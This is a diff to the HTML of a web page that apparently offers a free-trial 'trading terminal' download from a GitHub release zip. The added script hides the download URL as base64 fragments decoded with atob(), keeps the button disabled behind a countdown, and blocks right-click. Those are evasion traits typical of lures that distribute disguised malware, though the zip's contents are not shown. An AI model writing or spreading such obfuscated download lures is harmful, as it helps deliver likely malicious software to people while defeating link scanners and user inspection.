@@ -129,10 +129,54 @@
 				</p></h4>
                 <br>
 				<center>
-				<p style="font-size: 1.05rem; color: #FF3697; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic;">
-				 <p><span style="font-size:15px;"><b>Enjoy a 7-day free trial — no strings attached</b><br>
-                 <a href="https://github.com/Amir-07/stake/releases/download/terminal/TTerminal.zip" target="_blank"><img alt="" border="0" height="55" src="https://terminal-trade.github.io/Trading-Assistant/but.gif" width="300" /></a></p>
-				 </center>
+        <p style="font-size: 1.05rem; color: #FF3697; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic;">
+            <span style="font-size:15px;">
+                <b>Enjoy a 7-day free trial — no strings attached</b><br>
+            </span>
+        </p>
+
+        <button id="dlBtn2" disabled style="background: transparent; border: none; cursor: not-allowed; opacity: 0.7;">
+            <img src="https://terminal-trade.github.io/Trading-Assistant/but.gif" width="300" height="55" border="0" alt="Download" />
+        </button>
+    </center>
+
+    <script>
+      var p = [
+        "aHR0cHM6Ly9naXRodWIuY29tL0FtaXItMDcvc3Rha2Uv",
+        "cmVsZWFzZXMvZG93bmxvYWQvdGVybWluYWwv",
+        "VFRlcm1pbmFsLnppcA=="
+      ];
+
+      function u() {
+        return atob(p.join(''));
+      }
+
+      var s = 2;
+      function t() {
+        if (s <= 0) {
+          e();
+          return;
+        }
+        s--;
+        setTimeout(t, 1000);
+      }
+
+      function e() {
+        var b = document.getElementById('dlBtn2');
+        b.disabled = false;
+        b.style.opacity = '1';
+        b.style.cursor = 'pointer';
+        b.addEventListener('click', function() {
+          window.open(u(), '_blank', 'noopener,noreferrer');
+        }, { once: true });
+      }
+
+      document.addEventListener('DOMContentLoaded', function() {
+        var b = document.getElementById('dlBtn2');
+        b.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+        t();
+      });
+    </script>
 
                  <div class="separator" style="clear: both; text-align: center;"><b><span style="font-size: small;">This file was downloaded</span></b> <img border="0" src="https://counter.co.kz/CounterCoKz?page=terminal-trade.github.io_Trading-Assistant&amp;style=ainv&amp;digits=100000000000" /> <b>times.</b></div> 
 				</p></h4>
